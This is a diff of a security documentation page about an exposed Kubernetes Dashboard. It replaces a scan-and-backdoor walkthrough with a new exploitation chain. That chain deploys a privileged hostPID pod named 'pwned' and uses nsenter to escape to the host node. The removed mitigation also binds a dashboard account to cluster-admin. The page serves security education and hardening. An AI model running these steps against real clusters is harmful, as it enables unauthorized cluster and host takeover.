@@ -1,140 +1,103 @@
 ---
-sidebar_position: 3
-title: Exposed Kubernetes Dashboard
-description: Exploiting an exposed Kubernetes Dashboard and implementing best practices to secure dashboard access.
+sidebar_position: 8
+title: "Exposed Kubernetes Dashboard"
+description: "How an exposed and over-privileged Kubernetes Dashboard can become an entry point for full cluster compromise."
 ---
 
 # Exposed Kubernetes Dashboard
 
-The Kubernetes Dashboard is a web-based interface for managing Kubernetes clusters. However, if not properly secured, it can become a significant attack vector. An exposed dashboard with admin privileges and no authentication can allow an attacker to gain full control over the cluster.
+The Kubernetes Dashboard is a web-based UI for managing workloads and cluster resources. While useful for development and troubleshooting, it can pose a serious security risk if exposed without proper network controls, authentication, and access restrictions.
+
+This article explores how multiple misconfigurations can align to expose the Dashboard and allow an attacker to gain full control over the cluster.
 
 ---
 
-## Exploitation Steps: Exposed Dashboard
+## Background
 
-An attacker can identify an open Kubernetes Dashboard by performing a port scan:
+In secure Kubernetes clusters, the Dashboard should not be accessible from the public internet, should require authentication, and should not be bound to a high-privilege service account. However, in misconfigured environments—especially development or test clusters—it is possible for all of these protections to be missing.
 
-```bash
-nmap -p 30000-32767 <cluster-ip>
+This scenario outlines a chain of misconfigurations that, when combined, lead to full cluster compromise.
+
+---
+
+## Common Misconfigurations
+
+The following conditions must be present for the Dashboard to be exploitable:
+
+- The Dashboard is accessible externally through a public IP or port.
+- Authentication is disabled or bypassed.
+- The Dashboard's service account is bound to a high-privilege ClusterRole, such as `cluster-admin`.
+- Network-level controls (e.g., firewall rules or security groups) allow external access to the exposed port.
+
+Any one of these in isolation may not result in a successful exploit. Together, they enable full administrative access to the cluster.
+
+---
+
+## Exploitation Walkthrough
+
+### Step 1: Access the Dashboard
+
+The attacker identifies a publicly exposed Kubernetes Dashboard through port scanning, misconfigured Ingress, or a LoadBalancer service.
+
+For example:
+
+```
+http://<public-ip>:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
 ```
 
-### 1. Access the Dashboard Without Authentication
+If no authentication is required, the attacker gains direct access to the UI.
 
-The attacker locates the dashboard on a NodePort and accesses it through a web browser:
+### Step 2: Explore Available Actions
 
-```bash
-http://<cluster-ip>:<node-port>/
-```
+Once inside the Dashboard, the attacker tests for permissions such as:
 
-### 2. Execute Commands in the Cluster
+- Viewing namespaces, secrets, pods, and deployments
+- Creating new resources
+- Executing commands inside running pods
 
-The attacker uses the dashboard's terminal to execute commands in a privileged pod:
+If the Dashboard is using a service account with `cluster-admin` permissions, all of these actions are allowed.
 
-```bash
-kubectl exec -it privileged-pod -- /bin/sh
-```
+### Step 3: Deploy a Privileged Pod
 
-### 3. Create a New Admin User
-
-The attacker creates a new admin ServiceAccount and binds it to the cluster-admin role:
+The attacker uses the Dashboard’s resource creation feature to deploy a pod with host-level access:
 
 ```yaml
 apiVersion: v1
-kind: ServiceAccount
+kind: Pod
 metadata:
-  name: attacker-admin
-  namespace: kube-system
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: attacker-admin-binding
-subjects:
-  - kind: ServiceAccount
-    name: attacker-admin
-    namespace: kube-system
-roleRef:
-  kind: ClusterRole
-  name: cluster-admin
-  apiGroup: rbac.authorization.k8s.io
+  name: pwned
+spec:
+  containers:
+  - name: shell
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "sleep infinity"]
+    securityContext:
+      privileged: true
+  hostPID: true
+  restartPolicy: Never
 ```
 
-### Result
+The pod runs in privileged mode with access to the host process namespace.
 
-The attacker gains admin access to the cluster, enabling them to deploy malicious workloads, exfiltrate data, or destroy resources.
+### Step 4: Escape to the Host System
 
----
-
-## Mitigation Techniques and Fixes
-
-### 1. Avoid Exposing the Dashboard Publicly
-
-**Issue:** The dashboard is accessible without authentication over a NodePort.<br/>
-**Fix:** Use a secure network proxy or port-forwarding instead.
-
-#### Secure Access with Port Forwarding
+Using the Dashboard’s Exec feature, the attacker enters the pod and executes the following command:
 
 ```bash
-kubectl proxy
-# Access the dashboard securely
-http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
+nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
 ```
 
-### 2. Enforce Authentication
-
-**Issue:** Lack of authentication allows unauthorized access.<br/>
-**Fix:** Implement token-based authentication and disable guest access.
-
-#### Enable Authentication via Service Account Token
-
-```bash
-kubectl create serviceaccount dashboard-admin -n kube-system
-kubectl create clusterrolebinding dashboard-admin-binding \
-  --clusterrole=cluster-admin \
-  --serviceaccount=kube-system:dashboard-admin
-kubectl get secrets -n kube-system | grep dashboard-admin
-kubectl describe secret <dashboard-admin-token> -n kube-system
-```
-
-### 3. Restrict Dashboard Privileges
-
-**Issue:** The dashboard runs with cluster-admin privileges, exposing the entire cluster to risk.<br/>
-**Fix:** Limit the ServiceAccount permissions using RBAC.
-
-#### Create a Restricted Role for the Dashboard
-
-```yaml
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  name: restricted-dashboard-role
-  namespace: kube-system
-rules:
-  - apiGroups: [""]
-    resources: ["pods", "services"]
-    verbs: ["get", "list"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: restricted-dashboard-binding
-  namespace: kube-system
-subjects:
-  - kind: ServiceAccount
-    name: dashboard
-    namespace: kube-system
-roleRef:
-  kind: Role
-  name: restricted-dashboard-role
-  apiGroup: rbac.authorization.k8s.io
-```
+If successful, the attacker escapes the container and gains a shell on the host node, effectively bypassing Kubernetes isolation.
 
 ---
 
-## Conclusion
+## Summary
 
-To secure the Kubernetes Dashboard:
+An exposed and over-privileged Kubernetes Dashboard is not a vulnerability in itself, but rather the result of multiple misconfigurations. When combined, these missteps provide an attacker with a clear path to full cluster takeover.
 
-- Never expose the dashboard directly to the internet.
-- Always enforce authentication using Service Account tokens.
-- Apply the principle of least privilege by assigning restricted roles to the dashboard.
+Although most secure production environments would not be affected by this chain, it remains a valuable example for understanding how layered security misconfigurations can be exploited. It also highlights the importance of hardening development and staging environments to the same standard as production.
+
+For guidance on how to mitigate this risk, refer to the mitigation guide:
+
+[Exposed Dashboard Mitigation](/docs/best_practices/cluster_setup_and_hardening/network_security/exposed_dashboard_mitigation)
